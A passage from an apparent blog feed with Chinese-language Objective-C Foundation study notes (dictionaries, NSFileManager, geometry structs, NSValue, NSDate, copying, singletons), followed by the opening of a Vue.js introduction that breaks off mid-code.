在创建可变字典数组的同时初始化键值对.</p><p>​                     *<em>注意:  NSMutableDictionary <em>dict = @{}; 这样是不行的.</em></em></p><ol start="2"><li><p>如何新增键值对.</p><pre><code>           \- (void)**setObject:**(ObjectType)anObject **forKey:**(KeyType &lt;NSCopying&gt;)aKey;           如果键重复.后添加的就会替换原有的.</code></pre></li><li><p>如何删除.</p><pre><code>           \- (void)removeAllObjects; 删除所有的键值对.           \- (void)removeObjectForKey:(KeyType)aKey; 删除指定的键值对.</code></pre></li><li><p>也可以将字典数组的信息持久化起来.</p><pre><code>           将字典数组的信息保存到plist文件中.           \- (BOOL)writeToFile:(NSString *)path atomically:(BOOL)useAuxiliaryFile;           从plist文件中还原回字典.           \+ (nullable NSDictionary&lt;KeyType, ObjectType&gt; *)dictionaryWithContentsOfFile:(NSString *)path;</code></pre></li></ol><h3 id="集合的内存管理"><a href="#集合的内存管理" class="headerlink" title="集合的内存管理"></a>集合的内存管理</h3><ol><li><p>集合</p><pre><code>    NSArray集合、NSDictionary字典集合 就叫做集合.</code></pre></li><li><p>在<strong>MRC的模式下</strong> 将1个对象存储到集合中,会不会影响对象的引用计数器.</p><pre><code>    **将对象存储到集合之中,会为这个对象的引用计数器+1**     **当集合销毁的时候 就会像存储在集合中的所有的对象发送1条release消息.**</code></pre></li><li><p>使用@[]或者@{}创建的集合已经是被autorelease过的了.   </p><pre><code>    直接调用和类同名的类方法创建的对象 也是被autorelease过的了.</code></pre></li><li><p>在ARC的模式下.集合的元素是1个强类型的指针.</p></li></ol><h3 id="NSFileManager"><a href="#NSFileManager" class="headerlink" title="NSFileManager"></a>NSFileManager</h3><ol><li><p>NSFileManger是Foundation框架提供的1个类.  </p><pre><code>    这个类作用: 用来操作磁盘上的文件 文件夹  对他们进行创建、删除、复制 拷贝 移动.....</code></pre></li><li><p>NSFileManager是1个类.</p><pre><code>    这个类的对象是以单例模式创建的.    如何得到NSFileManager的1个单例对象.   掉用这个类的类方法,defaultManager 就可以得到这个类的单例对象   NSFileManager *fileManager = [NSFileManager defaultManager];</code></pre></li><li><p>常用方法之 判断.</p><pre><code>    1). 判断指定的文件或者文件夹在磁盘上是否真实的存在</code></pre></li></ol><p>​            - (BOOL)fileExistsAtPath:(NSString *)path;</p><pre><code>       2).判断指定的路径是否真实的存储在我们的磁盘之上,并且判断这个路径是1个文件夹路径还是1个文件路径.</code></pre><p>​            - (BOOL)fileExistsAtPath:(NSString *)path isDirectory:(BOOL *)isDirectory;</p><p>​            返回值:代表这个路径是否真实存在.</p><p>​            参数指针: 代表这个路径是否是1个文件夹路径</p><pre><code>       3). 判断指定的文件夹或者文件是否可以读取.</code></pre><p>​             - (BOOL)isReadableFileAtPath:(NSString *)path;</p><pre><code>       4). 判断指定的文件夹或者文件是否可以写入.</code></pre><p>​             - (BOOL)isWritableFileAtPath:(NSString *)path;</p><pre><code>       5). 判断指定的文件夹或者文件是否可以删除.</code></pre><p>​             - (BOOL)isDeletableFileAtPath:(NSString *)path</p><ol start="4"><li><p>常见方法之 获取信息.</p><pre><code>   1).获取指定文件或者文件夹的属性信息.</code></pre></li></ol><p>​            - (NSDictionary *)attributesOfItemAtPath:(NSString *)path error:(NSError **)error</p><p>​            返回的是1个字典,如果要拿到特定的信息 通过key</p><pre><code>      2).获取指定目录下的所有的文件和目录. 是拿到指定目录下的所有的文件和目录 所有的后代目录和文件.</code></pre><p>​            子目录的子目录的子目录 所有的都可以拿到.</p><p>​            - (NSArray *)subpathsAtPath:(NSString *)path;</p><pre><code>      3).获取指定目录下的所有的子目录和文件 不保护孙子辈.</code></pre><p>​            - (NSArray *)contentsOfDirectoryAtPath:(NSString *)path error:(NSError **)error</p><ol start="5"><li><p>常见方法之 文件/目录的创建</p><pre><code>   1). 在指定的目录创建文件.</code></pre></li></ol><p>​            - (BOOL)createFileAtPath:(NSString *)path contents:(NSData *)data attributes:(NSDictionary *)attr</p><p>​              第1个参数: 要创建的文件的路径.</p><p>​              第2个参数: 这个文件的内容.  要传递这个文件的二进制格式. </p><p>​              这个二进制的数据格式 使用NSData对象来封装.</p><p>​               NSData: 将别的格式的数据转换为二进制数据.</p><p>​              将字符串转换为NSData二进制的方式.调用字符串对象的</p><p>​              - (NSData *)dataUsingEncoding:(NSStringEncoding)encoding</p><p>​              编码参数: NSUTF8StringEncoding</p><p>​              指定1个编码 就可以将字符串转换为二进制数据 存储在NSData对象之中.</p><p>​              最后再将这个二进制对象通过这个方法写入.</p><p>​              如果想创建1个空文件 第2个参数就给nil</p><p>​             第3个参数: 指定创建的文件的属性.如果想要使用系统的默认值使用nil</p><pre><code>  2). 在指定的目录创建文件夹.</code></pre><p>​        - (BOOL)createDirectoryAtPath:(NSString *)path withIntermediateDirectories:(BOOL)createIntermediates attributes:(NSDictionary *)attributes error:(NSError **)error</p><p>​            第1个参数: 路径.</p><p>​            第2个参数: YES,做一路创建. 如果是NO就不会做一路创建.</p><p>​            第3个参数: 指定属性 nil为系统默认属性.</p><p>​            第4个参数.</p><pre><code>  3).拷贝文件.</code></pre><p>​        - (BOOL)copyItemAtPath:(NSString *)srcPath toPath:(NSString *)dstPath error:(NSError **)error</p><pre><code>  4).移动文件 剪切 文件的重命名. 重名的原理: 将文件移动到原来的目录并改名.</code></pre><p>​        - (BOOL)moveItemAtPath:(NSString *)srcPath toPath:(NSString *)dstPath error:(NSError **)error</p><pre><code>  5).删除文件.</code></pre><p>​        - (BOOL)removeItemAtPath:(NSString *)path error:(NSError **)error</p><pre><code>   注意 删除的文件不会倒废纸篓 而是直接删除,所以请小心使用.</code></pre><h3 id="Foundation框架中常用的结构体"><a href="#Foundation框架中常用的结构体" class="headerlink" title="Foundation框架中常用的结构体"></a>Foundation框架中常用的结构体</h3><ol><li><p>定义1个变量来保存按钮在iOS界面上得位置. </p><pre><code>    我们定义1个结构体来表示控件在界面上得坐标.</code></pre></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line"> int x;</span><br><span class="line"> int y;</span><br><span class="line">&#125;CZPoint;</span><br><span class="line">CZPoint p1 = &#123;20,30&#125;;</span><br></pre></td></tr></table></figure><pre><code>       在Foundation框架中,已经定义了1个结构体CGPoint.</code></pre><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">struct CGPoint &#123;</span><br><span class="line"> CGFloat x;</span><br><span class="line"> CGFloat y;</span><br><span class="line">&#125;;</span><br><span class="line">typedef struct CGPoint CGPoint;</span><br></pre></td></tr></table></figure><pre><code>       CGFloat类型的实际上就是1个double类型的.          这个结构体一般情况下是用来表示坐标的. 用来表示控件在界面上得位置.          CGPoint与NSPoint都是同1个结构体,只不过定义两个名字.          typedef CGPoint NSPoint;</code></pre><p>   ———声明CGPoint变量并初始化的方式——-</p><pre><code>       1). CGPoint p1;</code></pre><p>​                     p1.x = 20;</p><p>​                     p1.y = 30；</p><pre><code>       2). CGPoint p1 = &#123;20,30&#125;;          3). CGPoint p1 = &#123;.x = 20, .y = 30&#125;；          4). Foundation框架中提供的函数来快速的创建1个CGPoint变量.</code></pre><p>​             a. <strong>CGPointMake(x,y);</strong></p><p>​                  <strong>CGPoint p1 =  CGPointMake(20, 30);</strong></p><p>​             b. <strong>NSMakePoint(x,y);</strong></p><p>​                  <strong>NSPoint p2 =  NSMakePoint(20, 30);</strong></p><ol start="2"><li><p>声明1个变量来保存某个控件的大小.</p><pre><code>    1个控件的大小,无非就是两个数据. 宽度、高度.</code></pre></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  double width;</span><br><span class="line">  double height;</span><br><span class="line">&#125;CZSize;</span><br><span class="line">CZSize size = &#123;50,20&#125;;</span><br></pre></td></tr></table></figure><pre><code>       Foundation框架中已经定义好了1个结构体叫做CGSize;</code></pre><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">struct CGSize &#123;</span><br><span class="line">   CGFloat width;</span><br><span class="line">   CGFloat height;</span><br><span class="line">  &#125;;</span><br><span class="line">  typedef struct CGSize CGSize;</span><br><span class="line">  typedef CGSize NSSize;</span><br></pre></td></tr></table></figure><p>   <strong>NSSize和CGSize是同1个结构体,只不过定义了两个名称.</strong></p><p>   <strong>CGSize结构体一般情况下用来表示控件的大小.</strong></p><p>   ——CGSize声明并初始化的方式———-</p><pre><code>       1). CGSize size;</code></pre><p>​                 size.width = 100;</p><p>​                 size.height = 30;</p><pre><code>       2). CGSize size = &#123;100,30&#125;;          3). CGSize size = &#123;.width = 100, .height = 30&#125;;          4). Foundation框架中提供了函数用来快速的得到1个CGSize结构体变量.</code></pre><p>​                 a. CGSizeMake(width,height);</p><p>​                   CGSize size0 =  CGSizeMake(100, 30);</p><p>​                 b. NSMakeSize(w,h);</p><p>​                   CGSize size1 =  NSMakeSize(100, 30);</p><ol start="3"><li><p>CGRect和NSRect</p><pre><code>    这是定义在Foundation框架中的1个结构体.</code></pre></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">struct CGRect &#123;</span><br><span class="line">   CGPoint origin;</span><br><span class="line">   CGSize size;</span><br><span class="line"> &#125;;</span><br><span class="line"> typedef struct CGRect CGRect;</span><br></pre></td></tr></table></figure><pre><code>       所以,这个结构体变量一般情况下存储1个控件的位置和大小.          typedef CGRect NSRect;          **NSRect和CGRect是一样的.**</code></pre><p>   —-CGRect的声明和初始化—–</p><pre><code>       1).</code></pre><p>​                 CGRect rect;</p><p>​                 rect.origin.x = 20;</p><p>​                 rect.origin.y = 40;</p><p>​                 rect.size.width = 100;</p><p>​                 rect.size.height = 30;</p><p>​         当结构体作为另外1个结构体或者对象的1个属性的时候,不能直接{}赋值.</p><p>​                 CGRect rect;</p><p>​                 rect.origin = (CGPoint){10,20};</p><p>​                 rect.size = (CGSize){100,30};</p><pre><code>       2). 也提供了函数来快速的创建CGRect变量</code></pre><p>​                 CGRect rect =  CGRectMake(10, 20, 100, 30);</p><p>​                 CGRect rect1 =  NSMakeRect(10, 20, 100, 30);</p><pre><code>     使用的时候. CGSize NSSize  建议使用CG...</code></pre><h3 id="NSValue"><a href="#NSValue" class="headerlink" title="NSValue"></a>NSValue</h3><ol><li><p>我们之前学习的结构体.</p><pre><code>    NSRange     CGPoint     CGSize     CGRect     这些都是结构体,它们的变量是无法存储到集合之中.</code></pre></li><li><p>解决方案:</p><pre><code>    先将这写结构体变量存储到OC对象中,再将OC对象存储到集合之中.</code></pre></li><li><p>NSValue 类 的对象就是用来包装结构体变量的.</p></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">#import &lt;Foundation/Foundation.h&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc, const char * argv[])</span><br><span class="line">&#123;  </span><br><span class="line">     CGSize s1 =   CGSizeMake(100, 10);</span><br><span class="line">     CGSize s2 =   CGSizeMake(100, 10);</span><br><span class="line">     CGSize s3 =   CGSizeMake(100, 10);</span><br><span class="line">     CGSize s4 =   CGSizeMake(100, 10);</span><br><span class="line">   </span><br><span class="line">     NSValue *v1 = [NSValue valueWithSize:s1];</span><br><span class="line">     NSValue *v2 = [NSValue valueWithSize:s2];</span><br><span class="line">     NSValue *v3 = [NSValue valueWithSize:s3];</span><br><span class="line">     NSValue *v4 = [NSValue valueWithSize:s4];</span><br><span class="line"></span><br><span class="line">    NSArray *arr = @[v1,v2,v3,v4];</span><br><span class="line">    for(NSValue *v in arr)</span><br><span class="line">    &#123;</span><br><span class="line">        NSLog(@&quot;%@&quot;,NSStringFromSize(v.sizeValue));</span><br><span class="line">    &#125;</span><br><span class="line">//    CGPoint p1 =  CGPointMake(10, 20);</span><br><span class="line">//    CGPoint p2 =  CGPointMake(110, 120);</span><br><span class="line">//    CGPoint p3 =  CGPointMake(110, 320);</span><br><span class="line">//    CGPoint p4 =  CGPointMake(110, 240);</span><br><span class="line">//    NSValue *v1 = [NSValue valueWithPoint:p1];</span><br><span class="line">//    NSValue *v2 = [NSValue valueWithPoint:p2];</span><br><span class="line">//    NSValue *v3 = [NSValue valueWithPoint:p3];</span><br><span class="line">//    NSValue *v4 = [NSValue valueWithPoint:p4]; </span><br><span class="line">//    NSArray *arr = @[v1,v2,v3,v4];  </span><br><span class="line">//    for(NSValue *v in arr)</span><br><span class="line">//    &#123;</span><br><span class="line">//        NSLog(@&quot;%@&quot;,NSStringFromPoint(v.pointValue));</span><br><span class="line">//    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="NSDate"><a href="#NSDate" class="headerlink" title="NSDate"></a>NSDate</h3><ol><li><p>NSDate 时间处理.</p><pre><code>   1). 可以得到当前时间. 创建1个NSDate对象就可以了,将这个对象输出,就是当前时间</code></pre></li></ol><p>​                    得到的是当前系统的格林威治时间. 0时区的时间. 东8区</p><p>​                    NSDate *date = [NSDate date];</p><p>​                    NSLog(@”%@”,date);</p><pre><code>      2). 格式化输出日期. 指定日期输出的格式</code></pre><p>​                    默认的格式 年-月-日 时:分:秒 +时区.</p><p>​                     NSDate *date = [NSDate date];</p><p>​                     NSLog(@”%@”,date);</p><p>​             //1.先要创建1个NSDateFormatter对象,这个对象作用:将1个日期转换成1个指定的格式.</p><p>​                     NSDateFormatter *formatter = [[NSDateFormatter alloc] init];</p><p>​             //2.告诉这个日期格式化器对象 要把日期转换个什么样子的.</p><p>​                     yyyy: 年份</p><p>​                     MM: 月份.</p><p>​                     mm: 分钟.</p><p>​                     dd: 天.</p><p>​                     hh: 12小时.</p><p>​                     HH: 24小时</p><p>​                     ss: 秒</p><p>​             <strong>formatter.dateFormat = @”yyyy年MM月dd日 HH点mm分ss秒”</strong></p><p>​             //3.使用日期格式化器 将指定的日期转换指定格式的字符串.</p><p>​                     *<em>NSString <em>str =[formatter stringFromDate:date];</em></em></p><p>​                     <strong>NSLog(@”str = %@”,str);</strong></p><pre><code>             **\- (NSString *)stringFromDate:(NSDate *)date; //将日期类型换换为字符串**              **\- (NSDate *)dateFromString:(NSString *)string;//将字符串转换为日期对象.**       注意: NSDate取到的时间是格林威治的时间.</code></pre><p>​          NSDateFormatter转换成字符串以后 会转换为当前系统的时区的时间.</p><ol start="2"><li><p>计算时间.</p><pre><code>   1). 想得到明天此时此刻的时间.</code></pre></li></ol><p>​                当前时间的基础之上 + 1天的时间.</p><p>​                在当前时间的基础之上,新增指定的时间.得到的1个新的时间.</p><p>​                        + (instancetype)dateWithTimeIntervalSinceNow:(NSTimeInterval)secs;</p><p>​                在当前的时间的基础之上,新增指定的秒.后的时间</p><p>​                得到东八区的时间:</p><p>​                        NSDate <em>d1 =[NSDate dateWithTimeIntervalSinceNow:8</em>60*60];</p><p>​                传入1个负数 就是在当前时间的基础之上减指定的秒数.</p><pre><code>      2). 求两个时间之间的差.</code></pre><p>​                可以实现的效果.就是可以计算出执行代码所花费的时间.</p><p>​                    - (NSTimeInterval)timeIntervalSinceDate:(NSDate *)anotherDate;</p><ol start="3"><li><p>得到NSDate中的年月日时分秒.</p><pre><code>   1). 得到时间的各个部分。可以使用日期格式化器来得到.   2). 比较复杂.           NSDate *date = [NSDate date];           //1.创建1个日历对象. 调用类方法currentCalendar得到1个日历对象.               NSCalendar *calendar = [NSCalendar currentCalendar];           //2.指定日历对象取到日期的对象的那些部分. 是要取那1个时间对象的部分.           // 返回1个日期组件对象.这个对象中就有指定日期的指定部分.               NSDateComponents *com =  [calendar components:NSCalendarUnitYear|NSCalendarUnitMonth|NSCalendarUnitDay fromDate:date];               NSLog(@&quot;%ld-%ld-%ld&quot;,com.year,com.month,com.day);</code></pre></li></ol><h3 id="copy"><a href="#copy" class="headerlink" title="copy"></a>copy</h3><ol><li><p>无论在MRC还是ARC下,<strong>如果属性的类型是NSString类型的. @property参数使用copy.</strong></p><p>@property(nonatomic,copy) NSString* name;</p></li><li><p>copy 复制</p><pre><code>    1). copy是1个方法.定义在NSObject类之中. 作用:拷贝对象.</code></pre></li></ol><p>​                     <strong>NSString —-&gt; copy —&gt; 不可变字符串  没有产生新对象,而是直接将对象本身的地址返回. 这种拷贝我们叫做浅拷贝</strong></p><p>​                     NSMutableString –&gt; copy –&gt; 是1个不可变的字符串对象 .  有产生1个新对象.这样的拷贝我们叫做深拷贝.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">NSString* str1=@&quot;jack&quot;;</span><br><span class="line">NSString*str2=[str1 copy];</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">NSMutableString* str1=[NSMutableString stringWithFormat:@&quot;jack&quot;];</span><br><span class="line">NSString* str2=[str1 copy];</span><br></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/zengxiang21/img/main/img/202204281733429.png" alt="image-20220428173316258" style="zoom:50%;" /><p>​    2). mutableCopy.定义在NSObject类之中. 作用:拷贝对象.</p><p>​                     NSString  —&gt; mutableCopy –&gt; 可变字符串对象. 深拷贝.</p><p>​                     NSMutableString –&gt; mutableCopy –&gt; 可变字符串对象 深拷贝</p><pre><code>                这是字符串的对象拷贝特点</code></pre><ol start="3"><li><p>字符串对象拷贝的引用计数器的问题.</p><pre><code>    1). 若字符串对象存储在常量区中. **存储在常量区的数据是不允许被回收的.**</code></pre></li></ol><p>​             <strong>所以存储在常量区的字符串对象的引用计数器是1个超大的数.并且retain和release无效.</strong></p><pre><code>       2). 若字符串存储在堆区. 这个字符串对象和普通的对象一样的.引用计数器默认是1.          3). 字符串对象如果是浅拷贝. 会将对象的引用计数器+1</code></pre><p>​             字符串对象如果是深拷贝. 原来的对象的引用计数器不变.新拷贝出来的对象的引用计数器为1.</p><h3 id="自定义类拷贝"><a href="#自定义类拷贝" class="headerlink" title="自定义类拷贝"></a>自定义类拷贝</h3><ol><li><p>copy方法的确是定义在NSObject类中的1个方法.</p><pre><code>    copy方法的内部调用了另外1个方法. copyWithZone:    这个方法是定义在NSCoping协议之中的.   因为我们的类没有遵守NSCoping协议,那么我们的类中就没有 copyWithZone:这个方法.     所以,当我们自定义的类调用copy方法的时候就会出错/</code></pre></li><li><p><strong>如果我们想要让我们自己的类具备对象拷贝的能力.那么就让我们的类遵守NSCoping协议</strong></p><pre><code>   **并实现copyWithZone:这个方法.**    **如果想要实现深拷贝:那么就重新创建1个对象.并将对象的属性的值复制.返回.**   **如果想要实现浅拷贝:那么就直接返回self**</code></pre></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">//Person.h</span><br><span class="line">#import &lt;Foundation/Foundation.h&gt;</span><br><span class="line">@interface Person : NSObject &lt;NSCopying&gt;</span><br><span class="line">@property(nonatomic,copy)NSString *name;</span><br><span class="line">@property(nonatomic,assign)int age;</span><br><span class="line">@end</span><br><span class="line"></span><br><span class="line">//Person.m</span><br><span class="line">#import &quot;Person.h&quot;</span><br><span class="line"></span><br><span class="line">@implementation Person</span><br><span class="line">- (id)copyWithZone:(NSZone *)zone</span><br><span class="line">&#123;</span><br><span class="line">    //1.如果要做深拷贝.你就重新创建1个对象.</span><br><span class="line">    //  把对象的属性的值 复制 到新对象中 将新对象返回.  </span><br><span class="line">//    Person *p1 = [Person new];</span><br><span class="line">//    p1.name = _name;</span><br><span class="line">//    p1.age = _age;</span><br><span class="line">//    return p1;  </span><br><span class="line">    return self;   </span><br><span class="line">&#125;</span><br><span class="line">@end</span><br><span class="line"></span><br><span class="line">//main.m</span><br><span class="line">#import &lt;Foundation/Foundation.h&gt;</span><br><span class="line">#import &quot;Person.h&quot;</span><br><span class="line">int main(int argc, const char * argv[])</span><br><span class="line">&#123;</span><br><span class="line">    Person *p1 = [Person new];</span><br><span class="line">    p1.name = @&quot;jack&quot;;</span><br><span class="line">    p1.age = 18;</span><br><span class="line">    Person *p2 =  [p1 copy];</span><br><span class="line">    NSLog(@&quot;p1 = %p&quot;,p1);</span><br><span class="line">    NSLog(@&quot;p2 = %p&quot;,p2);   </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="单例模式"><a href="#单例模式" class="headerlink" title="单例模式"></a>单例模式</h3><ol><li><p>单例模式:</p><pre><code>    1个类的对象,无论在何时创建也无论在什么地方创建 也无论创建多少次.创建出来的都是同1个对象。</code></pre></li><li><p>无论如何创建对象,最终都会调用alloc方法来创建对象.</p><pre><code>    1). **alloc方法的内部. 其实什么都没有做,只是调用了allocWithZone:方法**.     2). **实际上真正申请空间 创建对象的事情是allocWithZone:方法在做.**</code></pre></li><li><p>要实现单例模式.</p><pre><code>    重写+ allocWithZone:</code></pre></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">+ (instancetype)allocWithZone:(struct _NSZone *)zone</span><br><span class="line">&#123;</span><br><span class="line">  static id instance = nil;</span><br><span class="line">  if(instance == nil)</span><br><span class="line">  &#123;</span><br><span class="line">   instance = [super allocWithZone:zone];</span><br><span class="line">  &#125;</span><br><span class="line">  return instance;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="4"><li><p>单例模式的规范:</p><pre><code>    **如果类是1个单例模式.要求为类提供1个类方法.来返回这个单例对象.**     **类方法的名称必须以 shared类名; default类名;**</code></pre></li><li><p>什么时候要把类搞成单例.</p><pre><code>    1). 单例的特点</code></pre></li></ol><p>​                 无论何时、何地、创建对象,也不管创建多少次对象,得到都是同1个对象.</p><p>​                 单例对象可以被共享. 存储在单例对象中的数据可以被共享.</p><p>​                 也就是无论在什么地方创建单例对象 访问的都是同1个对象.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#import &quot;Person.h&quot;</span><br><span class="line">@implementation Person</span><br><span class="line">+ (instancetype)allocWithZone:(struct _NSZone *)zone</span><br><span class="line">&#123;</span><br><span class="line">    static id instance = nil;</span><br><span class="line">    if(instance == nil)</span><br><span class="line">    &#123;</span><br><span class="line">        instance = [super allocWithZone:zone];</span><br><span class="line">    &#125;</span><br><span class="line">    return instance;</span><br><span class="line">&#125;</span><br><span class="line">+ (instancetype)sharedPerson</span><br><span class="line">&#123;</span><br><span class="line">    return [self new];</span><br><span class="line">&#125;</span><br><span class="line">+ (instancetype)defaultPerson</span><br><span class="line">&#123;</span><br><span class="line">    return [self new];</span><br><span class="line">&#125;</span><br><span class="line">@end</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;objective-C概述&quot;&gt;&lt;a href=&quot;#objective-C概述&quot; class=&quot;headerlink&quot; title=&quot;objective-C概述&quot;&gt;&lt;/a&gt;objective-C概述&lt;/h1&gt;&lt;h2 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; cla</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Vue</title>
    <link href="https://zengxiang21.github.io/2022/01/12/vue/"/>
    <id>https://zengxiang21.github.io/2022/01/12/vue/</id>
    <published>2022-01-12T11:55:24.457Z</published>
    <updated>2022-03-21T05:04:24.407Z</updated>
    
    <content type="html"><![CDATA[<h1 id="vue"><a href="#vue" class="headerlink" title="vue"></a>vue</h1><h2 id="vue简介"><a href="#vue简介" class="headerlink" title="vue简介"></a>vue简介</h2><h3 id="1-Vue是什么"><a href="#1-Vue是什么" class="headerlink" title="1.Vue是什么"></a>1.Vue是什么</h3><p>vue是一套用于构建用户界面的渐进式的Javascript框架</p><p><img src="https://s2.loli.net/2022/01/12/JXfR1nCdVms5r8h.png" alt="image-20220112193654234"></p><h3 id="2-谁开发的"><a href="#2-谁开发的" class="headerlink" title="2.谁开发的"></a>2.谁开发的</h3><p>尤雨溪</p><p><img src="https://s2.loli.net/2022/01/12/RfMsWHjSYnz6NAa.png" alt="image-20220112193933818"></p><h3 id="3-Vue特点"><a href="#3-Vue特点" class="headerlink" title="3.Vue特点"></a>3.Vue特点</h3><ul><li><p>采用<strong>组件化</strong>的模式，提高代码复用率，且让代码更好维护</p><p><img src="https://s2.loli.net/2022/01/12/6ZOUfcmk2zR3Gl4.png" alt="image-20220112194541272"></p></li><li><p>采用声明式编码，无需操纵DOM，提高开发效率</p><p><img src="https://s2.loli.net/2022/01/12/qjFclBG5Z7MD8R3.png" alt="image-20220112195620424"></p><p><img src="https://s2.loli.net/2022/01/12/3BAwn4r2NDhJkcT.png" alt="img"></p></li><li><p>使用<strong>虚拟DOM和优秀的Diff算法</strong>，尽量复用DOM</p><p><img src="https://s2.loli.net/2022/01/12/HJ3MypFbINGxj4d.png" alt="image-20220112201158765"></p><p><img src="https://s2.loli.net/2022/01/12/lgcSFMuxozWOCJ6.png" alt="image-20220112201520841"></p><h2 id="第一个Vue代码"><a href="#第一个Vue代码" class="headerlink" title="第一个Vue代码"></a>第一个Vue代码</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>初识Vue<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 引入Vue --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span 